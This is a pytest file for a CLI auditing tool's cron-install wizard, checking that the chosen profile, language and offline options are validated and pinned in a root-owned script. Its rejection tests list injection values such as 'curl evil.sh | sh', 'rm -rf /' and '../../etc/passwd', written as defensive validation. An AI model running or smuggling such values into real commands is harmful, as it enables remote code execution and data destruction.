"""v0.16.1 — the scheduled audit is pinned, not inherited from root's config.

Before this version ``--install-cron`` generated ``bob --quiet --detailed``
and nothing else. A cron runs as root, so the audit picked up root's saved
profile and cron's bare ``$LANG`` — a different audit from the operator's, on
the same host. Since the profile drives the deductions, hence the exit code,
hence ``if [ "$RC" -gt 0 ]``, it also decided whether the mail was sent.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from bob.cron._options import (
    CRON_LANGS,
    CRON_PROFILES,
    build_audit_options,
    default_dimensions,
)
from bob.cron._io import build_script_content


# ---------------------------------------------------------------------------
# The closed sets
# ---------------------------------------------------------------------------

class TestClosedSets:

    def test_profiles_match_what_is_actually_shipped(self):
        """Drift guard: the wizard menu must not diverge from bob/data/profiles."""
        shipped = {p.stem for p in Path("bob/data/profiles").glob("*.conf")}
        assert set(CRON_PROFILES) == shipped, (
            f"wizard offers {sorted(CRON_PROFILES)} but ships {sorted(shipped)}"
        )

    def test_langs_match_shipped_locales(self):
        shipped = {p.stem for p in Path("bob/locales").glob("*.json")}
        assert set(CRON_LANGS) == shipped

    def test_help_text_names_the_same_profiles(self):
        """--help advertises the profile list; it must agree with the menu."""
        src = Path("bob/locales/en.json").read_text(encoding="utf-8")
        help_line = json.loads(src)["help"]["opt"]["profile"]
        for name in CRON_PROFILES:
            assert name in help_line


# ---------------------------------------------------------------------------
# Option rendering
# ---------------------------------------------------------------------------

class TestBuildAuditOptions:

    def test_every_dimension_is_emitted_explicitly(self):
        """Even at its default value — a cron must not inherit root's config."""
        assert build_audit_options("server", "en", False) == "--profile server --english"

    def test_french_selection(self):
        assert build_audit_options("desktop", "fr", False) == "--profile desktop --french"

    def test_offline_appended_only_when_selected(self):
        assert build_audit_options("container", "en", True).endswith(" --offline")
        assert "--offline" not in build_audit_options("container", "en", False)

    def test_all_combinations_are_well_formed(self):
        for prof in CRON_PROFILES:
            for lang in CRON_LANGS:
                for off in (True, False):
                    opts = build_audit_options(prof, lang, off)
                    assert re.match(r"^--profile \S+ --(english|french)( --offline)?$", opts)

    @pytest.mark.parametrize("bad", [
        "../../etc/passwd", "server; rm -rf /", "", "SERVER", "server ",
    ])
    def test_unknown_profile_is_refused(self, bad):
        with pytest.raises(ValueError):
            build_audit_options(bad, "en", False)

    @pytest.mark.parametrize("bad", ["de", "", "en fr", "--french"])
    def test_unknown_language_is_refused(self, bad):
        with pytest.raises(ValueError):
            build_audit_options("server", bad, False)


# ---------------------------------------------------------------------------
# Defaults come from the installing session
# ---------------------------------------------------------------------------

class _Cfg:
    def __init__(self, profile="", lang="", offline=False):
        self.profile, self.lang, self.offline = profile, lang, offline


class TestDefaultDimensions:

    def test_inherits_the_session(self):
        assert default_dimensions(_Cfg("desktop", "fr", True)) == ("desktop", "fr", True)

    def test_empty_profile_falls_back_to_server(self):
        assert default_dimensions(_Cfg("", "en", False))[0] == "server"

    def test_default_alias_normalises_to_server(self):
        assert default_dimensions(_Cfg("default", "en", False))[0] == "server"

    def test_unknown_values_never_reach_build(self):
        prof, lang, _ = default_dimensions(_Cfg("bogus", "de", False))
        build_audit_options(prof, lang, False)   # must not raise


# ---------------------------------------------------------------------------
# The generated script
# ---------------------------------------------------------------------------

class TestGeneratedScript:

    def test_options_land_on_the_audit_line(self):
        script = build_script_content("a@b.c", "/var/log/bob",
                                      "--profile desktop --french")
        line = next(ln for ln in script.splitlines()
                    if "--quiet --detailed" in ln)
        assert line.endswith("--quiet --detailed --profile desktop --french")

    def test_omitted_options_reproduce_the_pre_v0161_line(self):
        """Already-installed scripts carry no options; the default must match."""
        script = build_script_content("a@b.c", "/var/log/bob")
        line = next(ln for ln in script.splitlines()
                    if "--quiet --detailed" in ln)
        assert line.endswith("--quiet --detailed")

    def test_quiet_and_detailed_are_never_dropped(self):
        """They are structural: no terminal under cron, and the mail IS the .log."""
        for opts in ("", "--profile server --english --offline"):
            assert "--quiet --detailed" in build_script_content("a@b.c", "/l", opts)

    @pytest.mark.parametrize("malformed", [
        "--profile desktop --french; curl evil.sh | sh",
        "--profile desktop --french\nrm -rf /",
        "--profile ../../etc --english",
        "--exec /bin/sh",
        "--profile desktop",                 # missing the language flag
    ])
    def test_malformed_options_never_reach_a_root_owned_script(self, malformed):
        """The wizard constrains the choice, but this is a root write."""
        with pytest.raises(ValueError):
            build_script_content("a@b.c", "/var/log/bob", malformed)


# ---------------------------------------------------------------------------
# Locale parity
# ---------------------------------------------------------------------------

class TestLocaleParity:

    def test_every_new_key_exists_in_both_locales(self):
        en = json.loads(Path("bob/locales/en.json").read_text(encoding="utf-8"))
        fr = json.loads(Path("bob/locales/fr.json").read_text(encoding="utf-8"))
        flat = ["prompt_profile", "profile_hint", "invalid_profile",
                "prompt_lang", "lang_hint", "invalid_lang",
                "prompt_network", "network_online", "network_offline",
                "invalid_network", "audit_command"]
        for loc, d in (("en", en), ("fr", fr)):
            block = d["install_cron"]
            for key in flat:
                assert key in block, f"missing in {loc}.json: install_cron.{key}"
            # Nested under a dotted stem so the v0.15.3 orphan-key guard can
            # see them: it recognises ``t(f"stem.{var}")``, not ``stem_{var}``.
            for name in CRON_PROFILES:
                assert name in block["profile"], f"missing in {loc}.json: profile.{name}"
            for name in CRON_LANGS:
                assert name in block["lang"], f"missing in {loc}.json: lang.{name}"

    def test_audit_command_interpolates_in_both_locales(self):
        for loc in ("en", "fr"):
            d = json.loads(Path(f"bob/locales/{loc}.json").read_text(encoding="utf-8"))
            assert "{command}" in d["install_cron"]["audit_command"]


# ---------------------------------------------------------------------------
# The real contract: what the wizard writes is what the CLI reads back
# ---------------------------------------------------------------------------

class TestRoundTripThroughTheParser:
    """A regex says the string is well-shaped; only the parser says it works.

    The generated script is executed months later by cron with nobody
    watching, so an option the wizard emits but the CLI rejects would fail
    silently — and a mis-parsed one would run a different audit than the
    operator chose, which is the very defect v0.16.1 exists to close.
    """

    @pytest.mark.parametrize("profile", CRON_PROFILES)
    @pytest.mark.parametrize("lang", CRON_LANGS)
    @pytest.mark.parametrize("offline", [False, True])
    def test_every_combination_parses_back_to_what_was_chosen(self, profile, lang, offline):
        import shlex

        from bob.cli import parse_args

        opts = build_audit_options(profile, lang, offline)
        config = parse_args(["--quiet", "--detailed"] + shlex.split(opts))

        assert config.profile == profile
        assert config.lang == lang
        assert config.offline is offline
        assert config.quiet and config.detailed

    def test_the_script_line_is_what_gets_parsed(self):
        """Read the option string back out of the generated script itself."""
        import shlex

        from bob.cli import parse_args

        opts = build_audit_options("workstation", "fr", True)
        script = build_script_content("a@b.c", "/var/log/bob", opts)
        line = next(ln for ln in script.splitlines() if "--quiet --detailed" in ln)
        argv = shlex.split(line)[1:]        # drop the binary path

        config = parse_args(argv)
        assert (config.profile, config.lang, config.offline) == ("workstation", "fr", True)


# ---------------------------------------------------------------------------
# The curses path cannot be driven through a pipe — guard it statically
# ---------------------------------------------------------------------------

class TestCursesWizardCarriesTheOptions:
    """``--install-cron`` runs the curses TUI whenever stdout is a TTY, which
    is the normal case for a human installing a cron. A regression there would
    be invisible to every pipe-driven test, so the two flows are pinned to the
    same contract: three screens, and the chosen options reaching the script.
    """

    @staticmethod
    def _source() -> str:
        return Path("bob/tui/cron.py").read_text(encoding="utf-8")

    def test_the_three_steps_exist(self):
        src = self._source()
        for state in ("STEP_PROFILE", "STEP_LANG", "STEP_NETWORK"):
            assert f"elif step == {state}:" in src, f"no branch handles {state}"

    @staticmethod
    def _branch_bodies() -> "dict[str, str]":
        """Unparsed body of each ``elif step == STEP_X:`` branch, keyed by X.

        Asserting on the whole file would only prove a string exists SOMEWHERE
        — and every one of these edge names appears in more than one branch,
        so a presence check cannot tell a correct wizard from a broken one.
        """
        import ast

        tree = ast.parse(Path("bob/tui/cron.py").read_text(encoding="utf-8"))
        fn = next(n for n in ast.walk(tree)
                  if isinstance(n, ast.FunctionDef) and n.name == "_run_install_cron_curses")
        out: dict[str, str] = {}
        for node in ast.walk(fn):
            if not isinstance(node, ast.If) or not isinstance(node.test, ast.Compare):
                continue
            left, comparators = node.test.left, node.test.comparators
            if getattr(left, "id", "") != "step" or not comparators:
                continue
            name = getattr(comparators[0], "id", "")
            if name.startswith("STEP_"):
                out[name] = "\n".join(ast.unparse(st) for st in node.body)
        return out

    def test_the_steps_run_in_the_requested_order(self):
        """Profile → language → network, each branch handing to the next."""
        bodies = self._branch_bodies()
        for state in ("STEP_PROFILE", "STEP_LANG", "STEP_NETWORK"):
            assert state in bodies, f"no branch handles {state}"

        assert "step = STEP_PROFILE" in bodies["STEP_EMAIL"], \
            "the email screen no longer leads into the profile screen"
        assert "step = STEP_LANG" in bodies["STEP_PROFILE"], \
            "the profile screen skips the language screen"
        assert "step = STEP_NETWORK" in bodies["STEP_LANG"], \
            "the language screen skips the network screen"
        assert "step = STEP_OVERWRITE" in bodies["STEP_NETWORK"], \
            "the network screen no longer reaches the write step"

    def test_esc_walks_back_one_screen_at_a_time(self):
        """Esc must reach the PREVIOUS screen, not skip one or leave the wizard."""
        bodies = self._branch_bodies()
        for state, expected in (
            ("STEP_PROFILE", "STEP_EMAIL"),
            ("STEP_LANG", "STEP_PROFILE"),
            ("STEP_NETWORK", "STEP_LANG"),
        ):
            body = bodies[state]
            assert f"step = {expected}" in body, \
                f"Esc on {state} no longer goes back to {expected}"
            forward = {"STEP_PROFILE": "STEP_LANG",
                       "STEP_LANG": "STEP_NETWORK",
                       "STEP_NETWORK": "STEP_OVERWRITE"}[state]
            # Exactly two edges leave each screen: Esc back, and Enter forward.
            edges = {ln.split("step = ")[1].strip()
                     for ln in body.splitlines() if "step = " in ln}
            assert edges == {expected, forward}, \
                f"{state} has unexpected transitions: {sorted(edges)}"

    def test_the_options_are_built_on_the_last_screen(self):
        bodies = self._branch_bodies()
        assert "build_audit_options" in bodies["STEP_NETWORK"]

    def test_the_generated_script_receives_the_options(self):
        """The whole point: the curses flow must not fall back to the bare line."""
        import ast

        tree = ast.parse(self._source())
        calls = [n for n in ast.walk(tree)
                 if isinstance(n, ast.Call)
                 and getattr(n.func, "id", "") == "build_script_content"]
        assert calls, "curses flow no longer builds a script"
        for call in calls:
            assert len(call.args) == 3, (
                "curses build_script_content call dropped the audit options — "
                "the scheduled audit would silently revert to root's profile"
            )
